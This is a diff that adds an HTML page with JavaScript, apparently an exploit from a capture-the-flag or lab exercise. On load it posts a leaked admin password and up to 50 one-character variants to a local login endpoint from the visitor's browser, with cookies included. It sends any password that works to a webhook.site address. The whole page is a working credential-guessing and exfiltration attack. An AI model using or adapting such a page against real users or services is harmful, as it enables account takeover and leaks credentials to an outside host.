@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head><title>Password Verification</title></head>
+<body>
+<h1>Testing password variations...</h1>
+<pre id="output"></pre>
+<script>
+const output = document.getElementById('output');
+const leaked = 'lebah2cff5fdf7eef';
+const TARGET = 'https://127.0.0.1:9999/login';
+
+function log(msg) {
+    output.textContent += msg + '\n';
+    console.log(msg);
+}
+
+// Generate variations by changing 1 character at a time
+function generateVariations(password) {
+    const variations = [];
+    const hex = '0123456789abcdef';
+    
+    // Try changing each hex character (positions 5-16)
+    for (let pos = 5; pos < password.length; pos++) {
+        for (let c of hex) {
+            if (c !== password[pos]) {
+                const variant = password.substring(0, pos) + c + password.substring(pos + 1);
+                variations.push({ variant, changed: `pos${pos}:${password[pos]}->${c}` });
+            }
+        }
+    }
+    
+    return variations;
+}
+
+async function testLogin(username, password) {
+    try {
+        const response = await fetch(TARGET, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
+            credentials: 'include'
+        });
+        
+        const text = await response.text();
+        
+        // Check if login successful (no "Invalid credentials" error)
+        const success = !text.includes('Invalid credentials') && !text.includes('error');
+        return { success, redirected: response.redirected, status: response.status };
+    } catch (e) {
+        return { success: false, error: e.message };
+    }
+}
+
+async function verifyPassword() {
+    log('[*] Testing leaked password: ' + leaked);
+    
+    // Test original leaked password
+    const original = await testLogin('admin', leaked);
+    log(`Original: ${original.success ? '✓ SUCCESS!' : '✗ Failed'} (status: ${original.status})`);
+    
+    if (original.success) {
+        log('\n🎉 ORIGINAL PASSWORD WORKS!');
+        fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?SUCCESS=' + encodeURIComponent(leaked)).catch(e=>{});
+        return;
+    }
+    
+    log('\n[*] Testing single-character variations...');
+    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?testing_variations=started').catch(e=>{});
+    
+    const variations = generateVariations(leaked);
+    log(`Generated ${variations.length} variations to test...`);
+    
+    // Test variations in batches to avoid overwhelming
+    for (let i = 0; i < Math.min(50, variations.length); i++) {
+        const v = variations[i];
+        const result = await testLogin('admin', v.variant);
+        
+        if (result.success) {
+            log(`\n🎉 FOUND CORRECT PASSWORD!`);
+            log(`Password: ${v.variant}`);
+            log(`Change: ${v.changed}`);
+            
+            fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?CORRECT_PASSWORD=' + encodeURIComponent(v.variant)).catch(e=>{});
+            return;
+        }
+        
+        if (i % 10 === 0) {
+            log(`  Tested ${i+1}/${Math.min(50, variations.length)} variations...`);
+        }
+    }
+    
+    log('\n[-] No single-character fix found in first 50 variations');
+    log('The error might be in multiple positions or require different approach');
+}
+
+setTimeout(verifyPassword, 500);
+</script>
+</body>
+</html>
